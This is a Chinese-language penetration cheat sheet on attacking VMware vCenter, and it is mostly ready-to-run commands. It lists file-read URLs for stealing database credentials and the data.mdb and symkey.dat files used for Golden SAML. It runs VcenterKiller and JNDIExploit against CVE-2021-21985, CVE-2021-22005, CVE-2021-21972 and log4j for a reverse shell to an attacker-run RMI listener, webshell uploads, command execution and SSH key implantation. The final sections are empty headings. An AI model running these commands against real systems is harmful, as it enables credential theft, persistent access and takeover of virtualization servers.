# vCenter攻击面

## 信息收集

### SOAP版本探测

- 使用**nuclei**扫描目标**vCenter**版本信息

```shell
nuclei.exe -t nuclei-templates\http\technologies\vmware\vmware-detect.yaml -l host.list
```

### 任意文件读取

- 使用**nuclei**扫描目标查看是否存在**windwos任意文件读取**漏洞

```shell
nuclei.exe -t nuclei-templates\http\vulnerabilities\vmware\vmware-vcenter-lfi.yaml -l host.list
```

- 使用**nuclei**扫描目标查看是否存在**linux任意文件读取**漏洞

```shell
nuclei.exe -t nuclei-templates\http\vulnerabilities\vmware\vmware-vcenter-lfi-linux.yaml -l host.list
```

#### PSQL数据库凭据泄露

- **Windows**访问

```shell
https://<目标IP>/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
```

- **Linux**访问

```shell
https://<目标IP>/eam/vib?id=/etc/vmware-vpx/vcdb.properties
```

#### PSQL敏感信息查询

##### 获取data.mdb（用于制作Golden SAML）

- **Windows**访问

```shell
https://<目标IP>/eam/vib?id=C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
```

- **Linux**访问

```shell
https://<目标IP>/eam/vib?id=/storage/db/vmware-vmdir/data.mdb
```

##### 获取symkey.dat（用于利用CVE-2022-22948漏洞）

- **Windows**访问

```shell
https://<目标IP>/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\ssl\symkey.dat
```

- **Linux**访问

```shell
https://<目标IP>/eam/vib?id=/etc/vmware-vpx/ssl/symkey.dat
```

## 漏洞利用

### CVE-2021-21985

- 使用**nuclei**扫描目标查看是否存在**CVE-2021-21985**漏洞

```shell
nuclei.exe -t nuclei-templates\http\cves\2021\CVE-2021-21985.yaml -l host.list
```

- 使用**JNDIExploit-2.5**开启监听

```shell
java -jar JNDIExploit-2.5.jar
```

- 使用**VcenterKiller**利用**CVE-2021-21985**漏洞

```shell
./vckiller_linux_amd64 -u https://<目标IP>/ -m 21985 -t rshell -r rmi://<JNDIExploit监听IP>:1099/
```

### CVE-2021-22005

- 使用**nuclei**扫描目标查看是否存在**CVE-2021-22005**漏洞

```shell
nuclei.exe -t nuclei-templates\http\cves\2021\CVE-2021-22005.yaml -l host.list
```

- 使用**VcenterKiller**利用**CVE-2021-22005**漏洞

```shell
./vckiller_linux_amd64 -u https://<目标IP>/ -m 22005 -f shell.jsp
```

- 返回值为200即成功写入webshell

```shell
curl --insecure -I https://<目标IP>/idm/..;/shell.jsp
```

### log4j2 JNDI注入

- 使用**nuclei**扫描目标查看是否存在**log4j2 JNDI注入**漏洞

```shell
nuclei.exe -t nuclei-templates\http\vulnerabilities\vmware\vmware-vcenter-log4j-jndi-rce.yaml -l host.list
```

- 使用**VcenterKiller**利用**log4j2 JNDI注入**漏洞

```shell
.\vckiller_windows_amd64.exe -u https://172.28.180.174 -m log4center -t exec -c whoami
```

### Provider-SSRF

- 使用**nuclei**扫描目标查看是否存在**Provider-SSRF**漏洞

```shell
nuclei.exe -t nuclei-templates\http\vulnerabilities\vmware\vmware-vcenter-ssrf.yaml -l host.list
```

### CVE-2021-21972

- 使用**nuclei**扫描目标查看是否存在**CVE-2021-21972**漏洞

```shell
nuclei.exe -t nuclei-templates\http\cves\2021\CVE-2021-21972.yaml -l host.list
```

#### 上传webshell

- 使用**VcenterKiller**上传**webshell**

```shell
./vckiller_linux_amd64 -u https://<目标IP> -m 21972 -f shell.jsp
```

- 查看是否上传成功

```
curl --insecure https://<目标IP>/ui/resources/shell.jsp
```

#### 上传ssh公钥

- 使用**VcenterKiller**上传**ssh公钥**

```shell
./vckiller_linux_amd64 -u https://<目标IP> -m 21972 -f .ssh/id_rsa.pub -t ssh
```

### CVE-2019-5544

- 使用**check_slp**探测**CVE-2019-5544**漏洞

```shell
python3 check_slp.py host.list
```

### CVE-2020-3992

- 使用**check_slp**探测**CVE-2020-3992**漏洞

```shell
python3 check_slp.py host.list
```

### CVE-2021-21994

## 权限获取

### Golden SAML
